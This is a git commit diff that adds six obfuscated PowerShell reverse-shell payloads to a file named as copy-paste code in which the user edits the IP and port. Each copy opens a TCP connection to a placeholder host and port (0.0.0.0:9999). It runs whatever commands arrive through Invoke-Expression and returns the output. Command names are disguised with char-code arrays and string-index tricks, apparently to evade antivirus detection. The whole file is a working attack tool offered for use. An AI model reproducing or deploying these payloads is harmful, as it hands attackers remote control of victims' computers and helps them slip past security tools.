aa9397c11aa0dda77b01b95caf7e2bddf051ae3a
Demon warrior <145258279+Demonjokerwarrior@users.noreply.github.com>
2026-04-16 13:50:36 +0530

    Update this is a copy past code modify the  ip and port numbe .ps1

--- this is a copy past code modify the  ip and port numbe .ps1
+++ this is a copy past code modify the  ip and port numbe .ps1
@@ -9,3 +9,125 @@ while(($XxuRSuEK = $e5RPgo.Read($hFy27LVEFqvQkbS6ZW3jOm3HB, 0, $hFy27LVEFqvQkbS6
     $($((& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,101,53,82,80,103,111,46,70,108,117,115,104,40,41) |%{ ( [char][int] $_)})) | % {$_}))))
 };
 $(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,84,86,56,68,111,118,76,81,69,70,99,110,121,101,84,76,112,103,55,116,80,71,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})); 
+
+
+
+
+$7D1r1foaiSyfydeMx0pTqMI = & (("ICf142cWOLlSum7R0et9ZE5pbJgFoTarsXzBKGVQAhPndvqkiHUyw6Y-Nj3M8xD")[56,17,52,55,8,24,57,17,6,18] -join '') $([char](15*83/15)+[char](84*121/84)+[char](13+115-13)+[char](0+116-0)+[char](112+101-112)+[char](36+109-36)+[char](92+46-92)+[char](10*78/10)+[char](0+101-0)+[char](2+116-2)+[char](115+46-115)+[char](0+83-0)+[char](10*111/10)+[char](0+99-0)+[char](19+107-19)+[char](0+101-0)+[char](0+116-0)+[char](0+115-0)+[char](4*46/4)+[char](9*84/9)+[char](0+67-0)+[char](94+80-94)+[char](33+67-33)+[char](0+108-0)+[char](0+105-0)+[char](65+101-65)+[char](35+110-35)+[char](0+116-0))("0.0.0.0", "9999");
+$b2UGuf0AvCLFmniagzI1w = ($7D1r1foaiSyfydeMx0pTqMI.GetStream());[byte[]]$FtV = 0..$(65535+65535+0-0-65535)|<##>ForEach-Object{$_}<##>|%{0};
+while(($iK = $b2UGuf0AvCLFmniagzI1w.Read($FtV, 0, $FtV.Length)) -ne 0){
+    $EDJMIPL06w = (& (("ICf142cWOLlSum7R0et9ZE5pbJgFoTarsXzBKGVQAhPndvqkiHUyw6Y-Nj3M8xD")[56,17,52,55,8,24,57,17,6,18] -join '') -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_})).GetString($FtV,0, $iK);
+    $I9vJcif1 = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}) $EDJMIPL06w 2>&1 |<##>ForEach-Object{$_}<##>| & (("NAHzPdc3LpV-snTGEMvB6kWUZeuJFXQ4bqrwKh0RmOyxC2jiI9t87lfSD5ago1Y")[41,26,50,11,55,50,34,47,13,59] -join '') );
+    $whXuLxyYcW9JrAjbRvH = $I9vJcif1 + 'PS ' + (& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_})).Path + '> ';
+    $XlUD = ([text.encoding]::ASCII).GetBytes($whXuLxyYcW9JrAjbRvH);
+    $b2UGuf0AvCLFmniagzI1w.Write($XlUD,0,$XlUD.Length);
+    (($($b2UGuf0AvCLFmniagzI1w.Flush())))
+};
+$(($(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,55,68,49,114,49,102,111,97,105,83,121,102,121,100,101,77,120,48,112,84,113,77,73,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_}))));
+
+
+
+
+
+
+
+
+
+$iDu0vTZlItd = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}) $([char](0+83-0)+[char](0+121-0)+[char](82*115/82)+[char](14*116/14)+[char](50*101/50)+[char](0+109-0)+[char](17*46/17)+[char](0+78-0)+[char](49+101-49)+[char](62*116/62)+[char](43+46-43)+[char](92*83/92)+[char](27*111/27)+[char](112+99-112)+[char](111+107-111)+[char](0+101-0)+[char](77+116-77)+[char](0+115-0)+[char](55*46/55)+[char](83*84/83)+[char](0+67-0)+[char](63+80-63)+[char](16+67-16)+[char](0+108-0)+[char](83+105-83)+[char](1+101-1)+[char](86*110/86)+[char](66+116-66))("0.0.0.0", "9999");
+$4CEYAgzZfLBDxcla = (& (("dBC9FX1mu0YoOcS2GJNV3I7LpMH-P4KE5hiUwWyktbn6q8fReZTxAgrvljQaDzs")[34,42,55,11,39,48,27,48,51,24,54,48,62,62,34,11,42] -join '')([string]::join('', ( (36,105,68,117,48,118,84,90,108,73,116,100,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$McKPGsXi1X9tiuZYJc71UXn = 0..$(0-0+0+0-0-65535+65535+65535)|<##>%{$_}<##>|%{0};
+while(($ILL5e = $4CEYAgzZfLBDxcla.Read($McKPGsXi1X9tiuZYJc71UXn, 0, $McKPGsXi1X9tiuZYJc71UXn.Length)) -ne 0){
+    $CvWJiQ = (& ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}) -TypeName $([char](0+83-0)+[char](23*121/23)+[char](46*115/46)+[char](76*116/76)+[char](20*101/20)+[char](0+109-0)+[char](98+46-98)+[char](18+84-18)+[char](99*101/99)+[char](0+120-0)+[char](117+116-117)+[char](0+46-0)+[char](0+65-0)+[char](88*83/88)+[char](53*67/53)+[char](48+73-48)+[char](55*73/55)+[char](0+69-0)+[char](50*110/50)+[char](10+99-10)+[char](0+111-0)+[char](16*100/16)+[char](62*105/62)+[char](70+110-70)+[char](0+103-0))).GetString($McKPGsXi1X9tiuZYJc71UXn,0, $ILL5e);
+    $ZW = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}) $CvWJiQ 2>&1 |<##>%{$_}<##>| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}) );
+    $iPGgJl = $ZW + 'PS ' + (& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})).Path + '> ';
+    $Ys89C54tSnmV0MgQk6w2Kef = ([text.encoding]::ASCII).GetBytes($iPGgJl);
+    $4CEYAgzZfLBDxcla.Write($Ys89C54tSnmV0MgQk6w2Kef,0,$Ys89C54tSnmV0MgQk6w2Kef.Length);
+    ($4CEYAgzZfLBDxcla.Flush())
+};
+($iDu0vTZlItd.Close());
+
+
+
+$xPmtzySJ = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>%{$_}|%{ ( [char][int] $_)})) |<##>%{$_}| % {$_}) $([char](9*83/9)+[char](0+121-0)+[char](112+115-112)+[char](29*116/29)+[char](83+101-83)+[char](65*109/65)+[char](21+46-21)+[char](60*78/60)+[char](0+101-0)+[char](32+116-32)+[char](92*46/92)+[char](85*83/85)+[char](8+111-8)+[char](75+99-75)+[char](100+107-100)+[char](72*101/72)+[char](82+116-82)+[char](107*115/107)+[char](102+46-102)+[char](60+84-60)+[char](67*67/67)+[char](82*80/82)+[char](0+67-0)+[char](42+108-42)+[char](4*105/4)+[char](0+101-0)+[char](0+110-0)+[char](62*116/62))("0.0.0.0", "9999");
+$x8P6ia7xJLOXRLvfRJ9Ase = $(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,120,80,109,116,122,121,83,74,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$bytesHRn = 0..$(0+0+0+0-65535+65535+65535)|<##>%{$_}|%{0};
+while(($n6E953CDstSg = $x8P6ia7xJLOXRLvfRJ9Ase.Read($bytesHRn, 0, $bytesHRn.Length)) -ne 0){
+    $uDt7EwkxELH45V = (& ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>%{$_}|%{ ( [char][int] $_)})) |<##>%{$_}| % {$_}) -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |<##>%{$_}|%{ ( [char][int] $_)})) |<##>%{$_}| % {$_})).GetString($bytesHRn,0, $n6E953CDstSg);
+    $KwNNC3 = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>%{$_}|%{ ( [char][int] $_)})) |<##>%{$_}| % {$_}) $uDt7EwkxELH45V 2>&1 |<##>%{$_}| & (("ZT5RHhIOp94XPfrnlWQVSG7LBDkobJ3u1KiYFAC6U-wm8Mtzsjydc0NaExgq2ev")[7,31,46,41,20,46,14,34,15,58] -join '') );
+    $K0vX2c1ITEUzsKfIRvXWyc = $KwNNC3 + 'PS ' + (& (("n3QVTpeZxfqNDAvOzcRUuE0KSyj92XG4laisJPYgok8mtWI576d1Bw-FhLbCHrM")[30,6,44,54,57,40,17,33,44,34,40,0] -join '')).Path + '> ';
+    $nH9O = ([text.encoding]::ASCII).GetBytes($K0vX2c1ITEUzsKfIRvXWyc);
+    $x8P6ia7xJLOXRLvfRJ9Ase.Write($nH9O,0,$nH9O.Length);
+    $($x8P6ia7xJLOXRLvfRJ9Ase.Flush())
+};
+($xPmtzySJ.Close());
+
+
+
+
+$J7M4uyHgTjyvNBAjXcZ = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}|ForEach-Object{$_}| % {$_}) $([char](0+83-0)+[char](0+121-0)+[char](68+115-68)+[char](0+116-0)+[char](104+101-104)+[char](110*109/110)+[char](77*46/77)+[char](0+78-0)+[char](0+101-0)+[char](8*116/8)+[char](121+46-121)+[char](119*83/119)+[char](75*111/75)+[char](0+99-0)+[char](33*107/33)+[char](16+101-16)+[char](103+116-103)+[char](104+115-104)+[char](0+46-0)+[char](0+84-0)+[char](6+67-6)+[char](0+80-0)+[char](17*67/17)+[char](86+108-86)+[char](122+105-122)+[char](32*101/32)+[char](99+110-99)+[char](68+116-68))("0.0.0.0", "9999");
+$jeHEQBDxw = (& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,74,55,77,52,117,121,72,103,84,106,121,118,78,66,65,106,88,99,90,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$xo2eYSSuhqREER7M = 0..(((65535)))|ForEach-Object{$_}|ForEach-Object{$_}|%{0};
+while(($v55i3L9OJuPHETfmaZrokJUk = $jeHEQBDxw.Read($xo2eYSSuhqREER7M, 0, $xo2eYSSuhqREER7M.Length)) -ne 0){
+    $WtCnPBGArLkX = (& ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}|ForEach-Object{$_}| % {$_}) -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |ForEach-Object{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}|ForEach-Object{$_}| % {$_})).GetString($xo2eYSSuhqREER7M,0, $v55i3L9OJuPHETfmaZrokJUk);
+    $v89kRBYhXDbFH3 = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |ForEach-Object{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}|ForEach-Object{$_}| % {$_}) $WtCnPBGArLkX 2>&1 |ForEach-Object{$_}|ForEach-Object{$_}| & (("wIHgh3sZrdoTXUF7YPvOKBf2aLlCM-mRkiJGx4S58uNc9QtbzjEeqp6y10ADnWV")[19,41,46,29,38,46,8,33,60,3] -join '') );
+    $7E0NUx6HUCj9r3D8q = $v89kRBYhXDbFH3 + 'PS ' + (& (("G8bhgOQHIlyYfzi5FKpqjXCDR3AnNo7s6rxPLcwSTkteUB1dmvJV04ZaE-29uWM")[0,43,42,57,36,29,37,55,42,14,29,27] -join '')).Path + '> ';
+    $uzT = ([text.encoding]::ASCII).GetBytes($7E0NUx6HUCj9r3D8q);
+    $jeHEQBDxw.Write($uzT,0,$uzT.Length);
+    $($jeHEQBDxw.Flush())
+};
+(($J7M4uyHgTjyvNBAjXcZ.Close()));
+
+
+
+
+
+
+
+$AdOw4MTAW69T3DxOtwhKgL = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>ForEach-Object{$_}|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}| % {$_}) ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>ForEach-Object{$_}|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}| % {$_})("0.0.0.0", "9999");
+$vH4ZoKTGNmEqpkLtb = ($($(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,65,100,79,119,52,77,84,65,87,54,57,84,51,68,120,79,116,119,104,75,103,76,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}))));[byte[]]$8Ip = 0..$($((65535)))|<##>ForEach-Object{$_}|%{0};
+while(($2FXBRrzClSaE6y5wHkq = $vH4ZoKTGNmEqpkLtb.Read($8Ip, 0, $8Ip.Length)) -ne 0){
+    $GZ4Vift = (& ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>ForEach-Object{$_}|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}| % {$_}) -TypeName $([char](1*83/1)+[char](94*121/94)+[char](75+115-75)+[char](9*116/9)+[char](81*101/81)+[char](101+109-101)+[char](0+46-0)+[char](54*84/54)+[char](122*101/122)+[char](0+120-0)+[char](0+116-0)+[char](0+46-0)+[char](56*65/56)+[char](84+83-84)+[char](57+67-57)+[char](0+73-0)+[char](27*73/27)+[char](75+69-75)+[char](0+110-0)+[char](0+99-0)+[char](115+111-115)+[char](1+100-1)+[char](104+105-104)+[char](13+110-13)+[char](122*103/122))).GetString($8Ip,0, $2FXBRrzClSaE6y5wHkq);
+    $Oc = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>ForEach-Object{$_}|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}| % {$_}) $GZ4Vift 2>&1 |<##>ForEach-Object{$_}| & (("nqgxAhIm5iP9GCue8SKbUOWdL-Nos7pa1ZEw0My43TktHzFBf2vcYXjJVrQl6DR")[21,14,43,25,17,43,57,9,0,2] -join '') );
+    $WckfMiyGXrKa = $Oc + 'PS ' + (& (("oZFAvLbY2rNKh3MODCpxe59yc0-f4Ptlsj6aBVzun718kUgEqGJRiTdmIwXSHQW")[49,20,30,26,5,0,24,35,30,52,0,40] -join '')).Path + '> ';
+    $pd = ([text.encoding]::ASCII).GetBytes($WckfMiyGXrKa);
+    $vH4ZoKTGNmEqpkLtb.Write($pd,0,$pd.Length);
+    $(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,118,72,52,90,111,75,84,71,78,109,69,113,112,107,76,116,98,46,70,108,117,115,104,40,41) |%{ ( [char][int] $_)})) | % {$_}))
+};
+((& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,65,100,79,119,52,77,84,65,87,54,57,84,51,68,120,79,116,119,104,75,103,76,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})));
+
+
+
+
+
+$zbrIm8 = & (("LhqokpN9fvglu-zIM5UEXadj6TnPscFVmi2JSe4BtZ3HWrCwOQAY810xD7GKbRy")[6,37,47,13,48,60,23,37,29,40] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}| % {$_})("0.0.0.0", "9999");
+$bgyLBFs4Kta1MrTJCv3Ahd5P2 = $($((& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,122,98,114,73,109,56,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}))));[byte[]]$NKqE1rikJy6opsaWw0F4 = 0..($(65535))|ForEach-Object{$_}|%{0};
+while(($quSHnb7xWOwRzMpQ4mV = $bgyLBFs4Kta1MrTJCv3Ahd5P2.Read($NKqE1rikJy6opsaWw0F4, 0, $NKqE1rikJy6opsaWw0F4.Length)) -ne 0){
+    $q0D7cBk6K = (& (("LhqokpN9fvglu-zIM5UEXadj6TnPscFVmi2JSe4BtZ3HWrCwOQAY810xD7GKbRy")[6,37,47,13,48,60,23,37,29,40] -join '') -TypeName $([char](0+83-0)+[char](78+121-78)+[char](25+115-25)+[char](0+116-0)+[char](88*101/88)+[char](0+109-0)+[char](107*46/107)+[char](0+84-0)+[char](92*101/92)+[char](109*120/109)+[char](49+116-49)+[char](108*46/108)+[char](95*65/95)+[char](51*83/51)+[char](38*67/38)+[char](0+73-0)+[char](0+73-0)+[char](0+69-0)+[char](100+110-100)+[char](0+99-0)+[char](93*111/93)+[char](10*100/10)+[char](86+105-86)+[char](58+110-58)+[char](17+103-17))).GetString($NKqE1rikJy6opsaWw0F4,0, $quSHnb7xWOwRzMpQ4mV);
+    $bgeJ7ym = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}| % {$_}) $q0D7cBk6K 2>&1 |ForEach-Object{$_}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |ForEach-Object{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}| % {$_}) );
+    $RpINZKCaDBxTkU3J40 = $bgeJ7ym + 'PS ' + (& (("hCwWSn3o6ZOzNe8J7tDyQ2Laf9kRIdA-cPiYMsqHbKUX04EpjFTlvGBx1ugrm5V")[53,13,17,31,22,7,32,23,17,34,7,5] -join '')).Path + '> ';
+    $X50aVhjWOge1 = ([text.encoding]::ASCII).GetBytes($RpINZKCaDBxTkU3J40);
+    $bgyLBFs4Kta1MrTJCv3Ahd5P2.Write($X50aVhjWOge1,0,$X50aVhjWOge1.Length);
+    $($bgyLBFs4Kta1MrTJCv3Ahd5P2.Flush())
+};
+((& (("28z-lhPg9CcOZaRGwmX5LiprIyQoUubeFkKD1Vj6tMdEYsNBx3WSqT4A7vJ0nHf")[21,60,57,27,33,31,3,31,48,22,23,31,45,45,21,27,60] -join '')([string]::join('', ( (36,122,98,114,73,109,56,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})));
+
+
+
+
+
+$01gu = & (("htGwY16oWvazIAk9SLgDVPrmc8bXeQ7uiqZ5Ed3j-MyCHTFsNB2RK0UJxpnf4Ol")[48,28,3,40,61,26,39,28,24,1] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_})("0.0.0.0", "9999");
+$SompmqEdjDa7Nu24I = $(($01gu.GetStream()));[byte[]]$D9v5LhZzwW = 0..(65535)|<##>ForEach-Object{$_}<##>|%{0};
+while(($HYui1Va9J = $SompmqEdjDa7Nu24I.Read($D9v5LhZzwW, 0, $D9v5LhZzwW.Length)) -ne 0){
+    $roaw = (& (("htGwY16oWvazIAk9SLgDVPrmc8bXeQ7uiqZ5Ed3j-MyCHTFsNB2RK0UJxpnf4Ol")[48,28,3,40,61,26,39,28,24,1] -join '') -TypeName $([char](66+83-66)+[char](88*121/88)+[char](90*115/90)+[char](10*116/10)+[char](41+101-41)+[char](45+109-45)+[char](6*46/6)+[char](14*84/14)+[char](8*101/8)+[char](97+120-97)+[char](0+116-0)+[char](25*46/25)+[char](47+65-47)+[char](30*83/30)+[char](0+67-0)+[char](89*73/89)+[char](113+73-113)+[char](0+69-0)+[char](54+110-54)+[char](3*99/3)+[char](19+111-19)+[char](112*100/112)+[char](90+105-90)+[char](70+110-70)+[char](86*103/86))).GetString($D9v5LhZzwW,0, $HYui1Va9J);
+    $jqfF9K7kXwYNS04yVr = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}) $roaw 2>&1 |<##>ForEach-Object{$_}<##>| & (("pHyraG932TBAPhiEbxYzLjFcgnlqD0ReK-8MswtV4dkWSXQ57ZU6N1fIvmCJoOu")[61,62,38,33,44,38,3,14,25,24] -join '') );
+    $R7bw = $jqfF9K7kXwYNS04yVr + 'PS ' + (& (("9eIouVDJPG1af3UnOjcStrzQ2bCHFX4KWNLAdkphBiy7g8Rv0Em5ZM-6qxYswlT")[9,1,20,54,34,3,18,11,20,41,3,15] -join '')).Path + '> ';
+    $Zc3w2bd4uP9 = ([text.encoding]::ASCII).GetBytes($R7bw);
+    $SompmqEdjDa7Nu24I.Write($Zc3w2bd4uP9,0,$Zc3w2bd4uP9.Length);
+    $((($SompmqEdjDa7Nu24I.Flush())))
+};
+$($01gu.Close());
+
+
+
+
+
+
+
+
